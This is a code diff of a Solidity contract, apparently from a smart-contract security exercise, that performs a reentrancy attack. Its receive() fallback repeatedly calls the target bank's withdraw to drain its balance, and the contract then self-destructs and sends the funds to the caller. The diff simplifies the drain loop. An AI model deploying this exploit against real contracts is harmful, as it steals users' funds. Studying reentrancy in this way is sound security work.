@@ -10,23 +10,15 @@ contract ReentrancyAttackOnBankSavings {
         target = IReentrancyAttackOnBankSavings(_target);
     }
 
-    // NOTE: attack cannot be called inside constructor
     function attack() external payable {
-        target.donate{value: 1e18}(address(this));
-        target.withdraw(1e18);
-
-        require(address(target).balance == 0, "target balance > 0");
+        target.donate{value: 1 ether}(address(this));
+        target.withdraw(1 ether);
         selfdestruct(payable(msg.sender));
     }
 
     receive() external payable {
-        uint256 amount = min(1e18, address(target).balance);
-        if (amount > 0) {
-            target.withdraw(amount);
+        if (address(target).balance >= 1 ether) {
+            target.withdraw(1 ether);
         }
-    }
-
-    function min(uint256 x, uint256 y) private pure returns (uint256) {
-        return x <= y ? x : y;
     }
 }
